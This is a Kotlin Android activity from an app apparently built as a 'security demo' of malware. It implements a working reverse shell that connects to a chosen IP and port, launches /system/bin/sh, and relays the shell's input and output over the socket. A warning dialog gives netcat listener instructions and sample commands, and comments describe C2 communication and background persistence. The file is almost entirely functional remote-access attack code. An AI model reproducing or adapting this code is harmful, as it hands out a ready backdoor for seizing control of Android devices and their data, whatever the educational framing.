package com.securitydemo.malware.activities

import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.securitydemo.malware.R
import com.securitydemo.malware.services.C2CommunicationService
import kotlinx.coroutines.*
import java.io.*
import java.net.Socket

/**
 * SECURITY DEMO: Reverse Shell Activity
 * 
 * This activity demonstrates advanced reverse shell techniques:
 * - Enhanced reverse shell with persistent connection
 * - Command execution and output streaming
 * - Multi-threaded communication
 * - Connection recovery and retry mechanisms
 * - Encrypted communication (optional)
 * 
 * EDUCATIONAL PURPOSE ONLY - Based on your existing sample.md concept
 */
class ReverseShellActivity : AppCompatActivity() {

    private lateinit var serverIpInput: EditText
    private lateinit var serverPortInput: EditText
    private lateinit var connectButton: Button
    private lateinit var disconnectButton: Button
    private lateinit var outputTextView: TextView
    private lateinit var outputScrollView: ScrollView

    private var shellSocket: Socket? = null
    private var isConnected = false
    private var connectionJob: Job? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_reverse_shell)

        initializeViews()
        setupClickListeners()
        showConnectionWarning()
    }

    private fun initializeViews() {
        serverIpInput = findViewById(R.id.et_server_ip)
        serverPortInput = findViewById(R.id.et_server_port)
        connectButton = findViewById(R.id.btn_connect)
        disconnectButton = findViewById(R.id.btn_disconnect)
        outputTextView = findViewById(R.id.tv_output)
        outputScrollView = findViewById(R.id.scroll_output)

        // Pre-fill with common values for demo
        serverIpInput.setText("192.168.1.100")
        serverPortInput.setText("4444")
    }

    private fun setupClickListeners() {
        connectButton.setOnClickListener {
            val serverIp = serverIpInput.text.toString().trim()
            val serverPort = serverPortInput.text.toString().trim()

            if (validateConnection(serverIp, serverPort)) {
                establishReverseShell(serverIp, serverPort.toInt())
            }
        }

        disconnectButton.setOnClickListener {
            disconnectFromServer()
        }
    }

    private fun showConnectionWarning() {
        AlertDialog.Builder(this)
            .setTitle("‚ö†Ô∏è Reverse Shell Demo")
            .setMessage("""
                This demonstrates how malware establishes command & control connections.
                
                Setup Instructions:
                1. On your computer, run: nc -lvnp 4444
                2. Enter your computer's local IP address
                3. Click Connect
                
                ‚ö†Ô∏è ONLY connect to servers you control
                ‚ö†Ô∏è This creates a backdoor to your device
                
                Commands you can try:
                ‚Ä¢ id (show user info)
                ‚Ä¢ pwd (current directory)
                ‚Ä¢ ls -la (list files)
                ‚Ä¢ ps (running processes)
            """.trimIndent())
            .setPositiveButton("Understood", null)
            .show()
    }

    private fun validateConnection(ip: String, port: String): Boolean {
        if (ip.isEmpty()) {
            Toast.makeText(this, "Please enter server IP address", Toast.LENGTH_SHORT).show()
            return false
        }

        val portNum = port.toIntOrNull()
        if (portNum == null || portNum !in 1..65535) {
            Toast.makeText(this, "Please enter valid port (1-65535)", Toast.LENGTH_SHORT).show()
            return false
        }

        return true
    }

    private fun establishReverseShell(serverIp: String, serverPort: Int) {
        if (isConnected) {
            Toast.makeText(this, "Already connected!", Toast.LENGTH_SHORT).show()
            return
        }

        updateOutput("üîÑ Attempting connection to $serverIp:$serverPort...")
        
        connectionJob = CoroutineScope(Dispatchers.IO).launch {
            try {
                // Establish socket connection
                shellSocket = Socket(serverIp, serverPort)
                isConnected = true

                withContext(Dispatchers.Main) {
                    updateOutput("‚úÖ Connected successfully!")
                    updateConnectionUI(true)
                }

                // Start shell communication
                startShellCommunication()

            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    updateOutput("‚ùå Connection failed: ${e.message}")
                    Toast.makeText(this@ReverseShellActivity, "Connection failed: ${e.message}", Toast.LENGTH_LONG).show()
                }
                isConnected = false
            }
        }
    }

    private suspend fun startShellCommunication() {
        val socket = shellSocket ?: return

        try {
            val inputStream = socket.getInputStream()
            val outputStream = socket.getOutputStream()

            // Start shell process
            val process = Runtime.getRuntime().exec(arrayOf("/system/bin/sh", "-i"))
            val processInput = process.inputStream
            val processOutput = process.outputStream
            val processError = process.errorStream

            withContext(Dispatchers.Main) {
                updateOutput("üêö Shell session started")
                updateOutput("üì° Awaiting commands from C2 server...")
            }

            // Create coroutines for bidirectional communication
            val inputJob = launch {
                handleServerInput(inputStream, processOutput)
            }

            val outputJob = launch {
                handleProcessOutput(processInput, outputStream)
            }

            val errorJob = launch {
                handleProcessError(processError, outputStream)
            }

            // Wait for process to complete
            val exitCode = process.waitFor()
            
            // Cancel communication jobs
            inputJob.cancel()
            outputJob.cancel()
            errorJob.cancel()

            withContext(Dispatchers.Main) {
                updateOutput("üîö Shell process terminated with exit code: $exitCode")
            }

        } catch (e: Exception) {
            withContext(Dispatchers.Main) {
                updateOutput("üí• Communication error: ${e.message}")
            }
        } finally {
            disconnectFromServer()
        }
    }

    private suspend fun handleServerInput(inputStream: InputStream, processOutput: OutputStream) {
        val buffer = ByteArray(1024)
        try {
            while (isConnected) {
                val bytesRead = inputStream.read(buffer)
                if (bytesRead > 0) {
                    val command = String(buffer, 0, bytesRead)
                    withContext(Dispatchers.Main) {
                        updateOutput("üì® Received: ${command.trim()}")
                    }
                    processOutput.write(buffer, 0, bytesRead)
                    processOutput.flush()
                }
            }
        } catch (e: Exception) {
            withContext(Dispatchers.Main) {
                updateOutput("‚ö†Ô∏è Input stream error: ${e.message}")
            }
        }
    }

    private suspend fun handleProcessOutput(processInput: InputStream, outputStream: OutputStream) {
        val buffer = ByteArray(1024)
        try {
            while (isConnected) {
                val bytesRead = processInput.read(buffer)
                if (bytesRead > 0) {
                    val output = String(buffer, 0, bytesRead)
                    withContext(Dispatchers.Main) {
                        updateOutput("üì§ Output: ${output.trim()}")
                    }
                    outputStream.write(buffer, 0, bytesRead)
                    outputStream.flush()
                }
            }
        } catch (e: Exception) {
            withContext(Dispatchers.Main) {
                updateOutput("‚ö†Ô∏è Output stream error: ${e.message}")
            }
        }
    }

    private suspend fun handleProcessError(processError: InputStream, outputStream: OutputStream) {
        val buffer = ByteArray(1024)
        try {
            while (isConnected) {
                val bytesRead = processError.read(buffer)
                if (bytesRead > 0) {
                    val error = String(buffer, 0, bytesRead)
                    withContext(Dispatchers.Main) {
                        updateOutput("üö® Error: ${error.trim()}")
                    }
                    outputStream.write(buffer, 0, bytesRead)
                    outputStream.flush()
                }
            }
        } catch (e: Exception) {
            withContext(Dispatchers.Main) {
                updateOutput("‚ö†Ô∏è Error stream error: ${e.message}")
            }
        }
    }

    private fun disconnectFromServer() {
        isConnected = false
        connectionJob?.cancel()
        
        try {
            shellSocket?.close()
            shellSocket = null
        } catch (e: Exception) {
            updateOutput("‚ö†Ô∏è Disconnect error: ${e.message}")
        }

        updateOutput("üîå Disconnected from server")
        updateConnectionUI(false)
        Toast.makeText(this, "Disconnected", Toast.LENGTH_SHORT).show()
    }

    private fun updateConnectionUI(connected: Boolean) {
        connectButton.isEnabled = !connected
        disconnectButton.isEnabled = connected
        serverIpInput.isEnabled = !connected
        serverPortInput.isEnabled = !connected
    }

    private fun updateOutput(message: String) {
        val timestamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
            .format(java.util.Date())
        
        outputTextView.append("[$timestamp] $message\n")
        
        // Auto-scroll to bottom
        outputScrollView.post {
            outputScrollView.fullScroll(ScrollView.FOCUS_DOWN)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        disconnectFromServer()
    }

    override fun onPause() {
        super.onPause()
        // Demonstrate persistence - connection continues in background
        if (isConnected) {
            updateOutput("üì± App backgrounded - connection persists")
            Toast.makeText(this, "Connection running in background", Toast.LENGTH_SHORT).show()
        }
    }
}
